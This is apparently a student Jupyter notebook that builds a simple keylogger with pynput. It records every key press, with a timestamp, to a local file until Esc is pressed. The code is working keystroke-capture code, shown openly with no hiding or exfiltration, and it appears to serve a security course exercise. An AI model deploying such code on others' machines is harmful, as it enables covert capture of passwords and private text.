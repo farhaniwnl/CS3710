{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true,
    "is_executing": true
   },
   "outputs": [],
   "source": [
    "!pip install pynput"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [
    "#necessary packages\n",
    "from pynput import keyboard\n",
    "import time"
   ],
   "metadata": {
    "collapsed": false,
    "is_executing": true
   }
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [
    "#file creation\n",
    "log_file = \"keystroke_logger.txt\"\n",
    "#check if logging is active\n",
    "logging_active = True"
   ],
   "metadata": {
    "collapsed": false,
    "is_executing": true
   }
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [
    "def press(key):\n",
    "    global logging_active\n",
    "    # When a key is pressed, this function will be called\n",
    "    try:\n",
    "        # this is where any key stroke should be appended to the file\n",
    "        with open(log_file, \"a\") as file:\n",
    "            if hasattr(key, 'char'):\n",
    "                file.write(f\"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key.char}\\n\")\n",
    "            else:\n",
    "                file.write(f\"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key}\\n\")\n",
    "    except Exception as e:\n",
    "        # Handle exceptions\n",
    "        print(f\"Error: {str(e)}\")\n",
    "\n",
    "    # Check if 'Esc' key was pressed to stop logging\n",
    "    if key == keyboard.Key.esc:\n",
    "        logging_active = False\n",
    "        return False  # Stop listener"
   ],
   "metadata": {
    "collapsed": false,
    "is_executing": true
   }
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [
    "print(\"Starting keylogger. Press 'Esc' to stop logging.\")\n"
   ],
   "metadata": {
    "collapsed": false,
    "is_executing": true
   }
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [
    "try:\n",
    "\n",
    "    with keyboard.Listener(on_press=press) as listener:\n",
    "        listener.join()\n",
    "except KeyboardInterrupt:\n",
    "    # Handle manual interruption\n",
    "    pass\n",
    "except Exception as e:\n",
    "    # Handle other potential exceptions\n",
    "    print(f\"Error: {str(e)}\")\n",
    "\n",
    "# Add a message to indicate that logging has stopped\n",
    "if not logging_active:\n",
    "    print(\"Logging stopped.\")"
   ],
   "metadata": {
    "collapsed": false,
    "is_executing": true
   }
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}
